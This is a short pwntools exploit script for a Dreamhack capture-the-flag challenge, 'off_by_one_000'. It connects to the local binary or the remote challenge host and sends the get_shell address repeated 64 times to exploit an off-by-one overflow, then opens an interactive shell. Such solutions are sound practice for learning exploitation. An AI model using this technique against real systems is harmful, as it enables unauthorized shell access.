#!/usr/bin/env python3

from pwn import *

exe = ELF("./off_by_one_000")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 13533)

    return r


def main():
    r = conn()

    payload = p32(exe.symbols["get_shell"]) * 64

    r.sendafter(b"Name: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()